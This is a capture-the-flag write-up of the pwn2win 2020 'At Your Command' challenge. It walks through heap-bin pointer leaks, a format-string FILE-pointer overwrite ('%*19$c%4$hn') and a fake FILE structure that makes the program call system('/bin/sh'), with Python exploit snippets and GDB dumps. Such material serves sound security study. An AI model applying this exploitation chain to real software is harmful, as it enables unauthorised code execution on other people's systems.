# At Your Command

This was a pwnable challenge from pwn2win 2020.

Checksec reveals that the binary has all protections enabled:
```bash
$ checksec command
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Additionally, `libc 2.27` was provided together with the challenge binary.

When running the binary, the classic CTF style menu is shown.

```bash
$ ./command
Welcome to the command system
=============================
Your name: myname
Welcome myname

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
```

* `Include`: Add a new chunk of memory consisting of an integer `priority` and reading 0x170 chars into the 0x180 large char buffer `command`
* `Review`: Show a command at the provided index
* `Delete`: Delete the command at the provided index  
* `List`: Show all registered commands
* `Send`: Open a file on the filesystem and write all commands to disk, then exit the program.

The command struct used by all those commands looks like this:

```c
struct __attribute__((aligned(8))) command_t
{
  __int64 priority[1];
  char command[0x180];
};
```

There are two bugs in the program. First in the delte function, only the first 8 bytes (`priority`) of the `command_t` struct are set to `0`:

```c
int __fastcall delete(command_t **mem)
{
  command_t *index; // rax
  int idx; // [rsp+1Ch] [rbp-4h]

  printf("Command index: ");
  LODWORD(index) = memset16_fgets16_atoll();
  idx = (int)index;
  if ( (int)index < 0 || (int)index > 9 )
    return (int)index;
  index = mem[(int)index];
  if ( !index )
    return (int)index;
  free(mem[idx]);
  mem[idx] = 0LL; // only sets first 8 bytes to 0.
  LODWORD(index) = puts("The command has been successfully deleted");
  return (int)index;
}
```

This means that all data in the `command` field persists. 

Recall, how a free memory chunk looks like (not tcache, larger than fastbin):

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

So, if we can free a chunk into the unsorted bin, it will contain a `bk` pointer at the start of the `command` field when it is allocated again.
This pointer will point into the `main_arena`, which is in `libc`.

First we allocate 10 chunks. Then we free them in reverse order, so they do not coalesce with the wilderness. The first 7 chunks go into the `0x190` tcache, the last 3 will be merged together to a 0x4b0 chunk in the unsorted bin. This last chunk will contain the `fd` and `bk` pointers into `libc`.

We now empty the tcache by allocating 7 chunks. The next allocation will now split the 0x4b0 chunk and take `0x190` from it for the 8th allocataion. By providing only 1 char to the `command` field, only the LSB of the  `bk` pointer will be overwritten. Using `review`, the `bk` pointer can be leaked and the `libc` base address can be determined from there. Note, that by overwriting the LSB with a constant value, the offset from the slightly overwritten `bk` to `libc` base will still always remain the same.

In code, this looke like this:
```python
# fill tcache and prepare large chunk for libc and heap leak
for i in range(10):
    include(i, "A"*8)
for i in range(10):
    delete(9-i)

# fill tcache
for i in range(7):
    include(i, "B")

# leak libc address from arena pointers (1 byte overwrite)
include(7, "C")
leak = review(7, True)
libc.address = leak - 0x3ecf43 # offset to base of libc
log.success("Libc base: " + hex(libc.address))
```

For this challenge, we do not necessarily need a heap leak. We did it anyway, as having more information never hurts.
Remember that we allocated and freed 10 chunks and not only 8, so that we would have a large chunk (0x4b0) in the unsorted bin. When the 8th allocation happens, malloc will see that there is no chunk of size 0x190 in `tcache`. Then it will notice that it has no chunk of that exact size in the unsorted bin. Thus, it will move the `0x4b0` sized chunk into the large bin. When this happens, it will write `fd_nextsize` and `bk_nextsize` into the 3rd and 4th address of the chunk. As currently there is only one large bin in use, they both will point the the chunk itself, meaning they contain heap pointers. Now, malloc will split the `0x4b0` chunk and take `0x190` from it to satisfy our request.

This chunks looks as follows:
```bash
gef>  x/32gx 0x55891fa40250
0x55891fa40250:	0x0000000000000000	0x0000000000000191 # header
0x55891fa40260:	0x0000000000000000	0x00007f21289ac043 # 0 in priority field, bk ptr
0x55891fa40270:	0x000055891fa40250	0x000055891fa40250 # fd_nextsize, bk_nextsize -> heap ptrs
0x55891fa40280:	0x0000000000000000	0x0000000000000000
```

Thus, by providing a command of length 8, we can overwrite the bk pointer and leak the heap pointer:

```python
# free chunk again
delete(7)
# overwrite bk pointer so we can leak heap ptrs 
include(7, "D"*8)
heap = review(7)
log.success("Heap: " + hex(heap))
```

Now that we have a heap and libc leak, we want to get code execution. The `send` function has a format string vulnerability, when it uses `snprintf` to directly print the provided username of length 0xC. 

```c
 for ( i = 0; i <= 9; ++i ) //store all commands
  {
    if ( mem->priority[i] )
      fprintf(*stream, "%lld:%s\n", *(_QWORD *)mem->priority[i], mem->priority[i] + 8);
  }
  snprintf(&src, 0xCuLL, name); // vulnerable
  strcpy(&s, "Mr. ");
  strcat(&s, &src);
  printf("You command %s!\n", &s);
```


Also recall, that `send` opens a FILE, to dump the content of all commands. Our exploit strategy now is to create a fake FILE on the heap, in one of the `command_t` chunks and use the format string vulnerability to change the original FILE pointer to point to our fake FILE.
 
The stack looks like this before the `snprintf` call:
```bash
x/32gx $rsp
0x7ffe8e8748e0:	0x00007ffe8e874940	0x00007ffe8e874950
0x7ffe8e8748f0:	0x0000000a56b3f080	0x0000000000000000
0x7ffe8e874900:	0x0000000000000000	0x0000000000000000
0x7ffe8e874910:	0x0000000000000000	0x0000000000000000
0x7ffe8e874920:	0x00007ffe00000000	0xef9dae9836814800
0x7ffe8e874930:	0x00007ffe8e8749b0	0x000056195693e500
0x7ffe8e874940:	0x00005619586bf3f0	0x000000000000000c # FILE pointer, size of 0xc
0x7ffe8e874950:	0x00005619586bf710	0x00005619586bf8a0 # the 10 command_t ptrs
0x7ffe8e874960:	0x00005619586bfa30	0x00005619586bfbc0
0x7ffe8e874970:	0x00005619586bfd50	0x00005619586bfee0
0x7ffe8e874980:	0x00005619586c0070	0x00005619586bf260
```
The FILE pointer can be overwritten using `%4$hn`. Now we need to know what value to write there. The bottom 3 nibbles (half a byte) will always stay the same, but the next nibble will be affected by ASLR. We can now either bruteforce it with a 1/16 chance, or use some format string black magic. We specify `%*19$c%4$hn` as the payload.
`%*19$c` will read the value at `0x7ffe8e874958`, containing the pointer to the fake FILE, and create a padding (`*`) of that length, effectively writing that number into `0x7ffe8e874940` using `%4$n`. The offset 19 was discovered using GDB and trial and error. If someone knows why it's this exact offset, let me know!

After the snprintf, the stack looks like this. We notice, that the FILE pointer has been changed and now points to chunk1:

```bash
x/32gx $rsp
0x7ffe8e8748e0:	0x00007ffe8e874940	0x00007ffe8e874950
0x7ffe8e8748f0:	0x0000000a56b3f080	0x0000000000000000
0x7ffe8e874900:	0x2020202020202020	0x0000000000202020
0x7ffe8e874910:	0x0000000000000000	0x0000000000000000
0x7ffe8e874920:	0x00007ffe00000000	0xef9dae9836814800
0x7ffe8e874930:	0x00007ffe8e8749b0	0x000056195693e500
0x7ffe8e874940:	0x00005619586bf8a0	0x000000000000000c # modified FILE ptr, same as chunk1
0x7ffe8e874950:	0x00005619586bf710	0x00005619586bf8a0 # chunk0, chunk1
0x7ffe8e874960:	0x00005619586bfa30	0x00005619586bfbc0
0x7ffe8e874970:	0x00005619586bfd50	0x00005619586bfee0
0x7ffe8e874980:	0x00005619586c0070	0x00005619586bf260
```

We now control the FILE through chunk 1. In libc versions up to 2.23 it was possible to create a fake vtable to execute arbitrary commands. In libc 2.27 this is no longer possible.

But there exists an article that explains how creating a fake `vtable` that will call `_IO_str_overflow` it is possible to get code execution: https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/. I highly recommend you to thoroughly read that article, it is very informative. 

In summary, it describes how to change `(char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);` to `fp->system("/bin/sh")`. 

Thus, we prepare the fake FILE in such a way, that `system("/bin/sh")` will be executed, once the FILE is closed.

We can now run the exploit, which will give us a shell, allowing us to read the flag: `CTF-BR{_wh4t_4_fUn_xpl_ch41n_mY_c0mm4nd3r_}`!

(The full exploit script is included in the Github repository)